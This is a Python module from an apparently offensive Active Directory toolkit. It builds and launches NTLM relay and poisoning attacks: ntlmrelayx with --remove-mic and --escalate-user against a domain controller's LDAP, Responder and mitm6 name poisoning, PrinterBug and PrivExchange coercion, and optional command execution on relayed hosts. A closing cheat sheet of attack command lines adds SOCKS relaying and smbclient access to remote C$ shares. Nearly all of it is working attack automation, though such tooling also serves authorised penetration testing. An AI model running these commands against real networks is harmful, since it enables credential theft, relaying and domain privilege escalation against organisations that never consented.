#!/usr/bin/env python3

import os
import re
import os
from src.utils import print_info, parse_creds
from src.process import Process

cwd = os.getcwd()

def create_ntlmrelayx_cmd(args):
    """
    Creates the ntlmrelayx cmommand string
    """
    relay_cmd = f'python {cwd}/tools/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'

    # PrinterBug/PrivExchange
    if args.user:
        dom, user, pw = parse_creds(args)
        target = f' -t ldap://{args.domain_controller}'
        relay_cmd = relay_cmd + f" --remove-mic --escalate-user {user}" + target
        return relay_cmd

    # Normal usage
    else:
        target = f' -tf '
        if args.target_file:
            target += args.target_file
        else:
            target += 'unsigned-smb-hosts.txt'

    relay_cmd = relay_cmd + target

    if args.mitm6:
        six_poison = ' -6 -wh NetProxy-Service -wa 2'
        relay_cmd = relay_cmd + six_poison

    if args.command:
        relay_cmd = relay_cmd + f' -c "{args.command}"'

    return relay_cmd

def start_ntlmrelayx(args):
    """
    Start ntlmrelayx
    """
    cmd = create_ntlmrelayx_cmd(args)
    logfile_name = 'ntlmrelayx'
    ntlmrelayx = start_process(cmd, logfile_name, live_output=True)

    return ntlmrelayx

def edit_responder_conf(switch, protocols, conf):
    """
    Edit Responder.conf

    Mandatory arguments:
    - switch : string of On or Off
    - protocols : the protocols to change, e.g., HTTP, SMB, POP, IMAP
    - conf : the Responder.conf config file location
    """
    if switch == 'On':
        opp_switch = 'Off'
    else:
        opp_switch = 'On'
    with open(conf, 'r') as f:
        filedata = f.read()
    for p in protocols:
        if re.search(p + ' = ' + opp_switch, filedata):
            filedata = filedata.replace(p + ' = ' + opp_switch, p + ' = ' + switch)
    with open(conf, 'w') as f:
        f.write(filedata)

def start_responder(iface):
    protocols = ['HTTP', 'SMB']
    switch = 'Off'
    conf = 'tools/Responder/Responder.conf'
    edit_responder_conf(switch, protocols, conf)
    cmd = f'python2 {cwd}/tools/Responder/Responder.py -wrd -I {iface}'

    logfile_name = 'responder'
    responder = start_process(cmd, logfile_name)

    return responder

def start_mitm6(args):
    cmd = f'python {cwd}/tools/mitm6/mitm6/mitm6.py --ignore-nofqdn'
    if args.domain:
        cmd = cmd + f' -d {args.domain}'
    if args.interface:
        cmd = cmd + f' -i {args.interface}'

    logfile_name = 'mitm6'
    mitm6 = start_process(cmd, logfile_name)

    return mitm6

def start_exchange_scan(args):
    with open(args.exchange_file, "r") as f:
        target = f.readlines()[0].strip()
    cmd = f'python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file {args.exchange_file} {args.user}@{target}'
    logfile_name = "exchange_scanner"
    scan = start_process(cmd, logfile_name, live_output=True)

    return scan

def start_printerbug(dom_user_passwd, exchange_server, local_ip):
    cmd = f'python {cwd}/tools/krbrelayx/printerbug.py {dom_user_passwd}@{exchange_server} {local_ip}'
    logfile = 'printerbug'
    printerbug = start_process(cmd, logfile)

    return printerbug

def start_privexchange(args, local_ip):
    dom, user, passwd = parse_creds(args)
    with open(args.exchange_file, "r+") as f:
        lines = f.readlines()
        exchange_server = lines[0].strip()
    cmd = f'python {cwd}/tools/PrivExchange/privexchange.py -ah {local_ip}, -u {user} -p \'{passwd}\' -d {dom} {exchange_server}'
    logfile = 'privexchange'
    privexchange = start_process(cmd, logfile)
    return privexchange


def start_process(cmd, logfile_name, live_output=False):
    proc = Process(cmd)
    logfile = f'{cwd}/logs/{logfile_name}.log'
    print_info(f"Running {proc.cmd}")
    proc.run(logfile, live_output=live_output)

    return proc

# regular
'python {}/tools/ntlmrelayx.py -tf smb-unsigned-hosts.txt -of {}/hashes-ntlmrelay-hashes -smb2support'
'python2 {}/tools/Responder/Responder.py -wrd -I <iface>'
# mitm6
'python {}/tools/ntlmrelayx.py -tf smb-unsigned-hosts.txt -6 -wh NetProxy-Service -wa 2 -smb2support'
'mitm6 -d <domain> --ignore-nofqnd'
'python2 {}/tools/Responder/Responder.py -wrd -I <iface>'
# PrivExchange
'python {}/tools/ntlmrelayx.py -t ldap://<DC> --remove-mic --escalate-user <UserYouHavePassFor>'
'python {}/tools/privexchange.py -ah <AttackerHost> <DC> -u <UserYouHavePassFor> -d testsegment.local'
# CVE-2019-1040
'python printerbug.py <DOMAIN/user>@<exchangeServer> <attacker ip>'
'ntlmrelayx.py --remove-mic --escalate-user <UserYouHavePassFor> -t ldap://<DC> -smb2support'
# SMB no admin - note tf should be in format smb://IP
'python ntlmrelayx.py -tf smb-unsigned-hosts.txt -socks -smb2support'
'ntlmrelayx> socks' # list all socks connections
'proxychains smbclient //<targetIP>/c$ -U <DOMAIN/user listed in captured SMB sessions>'